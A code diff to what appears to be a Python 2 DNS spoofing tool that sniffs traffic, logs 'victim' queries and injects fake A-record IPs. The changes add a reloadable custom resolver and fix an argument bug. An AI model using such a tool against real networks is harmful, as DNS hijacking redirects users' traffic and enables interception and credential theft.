@@ -16,6 +16,7 @@ import pcapy
 import os
 import signal
 import errno
+from time import sleep
 
 #dev = 'eth0'
 #ip  = '192.168.1.101'
@@ -28,7 +29,7 @@ prov_resp = ''
 
 dev = sys.argv[1]
 
-adminip = '192.168.1.82'
+adminip = '172.16.48.100'
 
 consultas = {}
 spoof = {}
@@ -40,6 +41,7 @@ specificspoof = {}
 LOGREQFILE = "dnslog.txt"
 LOGSNIFFFILE = "snifflog.txt"
 LOGALERTFILE = "dnsalert.txt"
+RESOLVCONF = "resolv.conf"
 
 nospoof_file = "nospoof.cfg"
 specific_file = "spoof.cfg"
@@ -50,6 +52,9 @@ if len(sys.argv) >2:
 
 if len(sys.argv) >3:
     ip2 = sys.argv[3]
+
+
+Resolver = dns.resolver.Resolver()
 
 ######################
 # GENERAL SECTION    #
@@ -63,9 +68,12 @@ def save_req(lfile,str):
 
 def SIGUSR1_handle(signalnum,frame):
 	global noserv
+	global Resolver
 	noserv = 0
 	print 'Reconfiguring....'
 	process_files()
+	Resolver.reset()
+	Resolver.read_resolv_conf(RESOLVCONF)
 	return
 
 def process_files():
@@ -233,14 +241,16 @@ def parse_packet(packet):
 def respuestas(name, type):
     global prov_ip
     global prov_resp
+    global Resolver
+
     print 'Query = ' + name + ' ' + type
     try:
-        answers = dns.resolver.query(name, type)
+        answers = Resolver.query(name, type)
     except Exception, e:
         print 'Exception...'
         return 0
     prov_resp = answers[0]
-    #print 'Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
+    print 'Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
     return answers
 
 
@@ -420,7 +430,7 @@ def std_A_qry(msg):
             return std_ASPOOF_qry(msg)
 
         ips = respuestas(qname.lower(), 'A')
-
+	#print "%d answers"%len(ips)
         if isinstance(ips,numbers.Integral) and not specificspoof.has_key(qname.lower()):
 			host2=''
 			if host[:5]=='wwww.' or host[:7]=='social.':
@@ -467,11 +477,13 @@ def std_A_qry(msg):
                         rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[2])
                         print 'Adding fake IP = ' + sys.argv[2]
                         resp.answer.append(rrset)
+			
 
                     if len(sys.argv) > 3:
-                        rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[3])
-                        print 'Adding fake IP = ' + sys.argv[4]
+			rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[3])
+                        print 'Adding fake IP = ' + sys.argv[3]
                         resp.answer.append(rrset)
+
         for ip in ips:
             print 'Adding real IP  = ' + ip.to_text()
             rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, ip.to_text())
@@ -531,6 +543,8 @@ def make_response(qry=None, id=None, RCODE=0):
 
 
 process_files()
+Resolver.reset()
+Resolver.read_resolv_conf(RESOLVCONF)
 signal.signal(signal.SIGUSR1,SIGUSR1_handle)
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -555,4 +569,3 @@ while True:
     if noserv:
     	DEBUGLOG('serving a request.')
     	requestHandler(address, message)
-
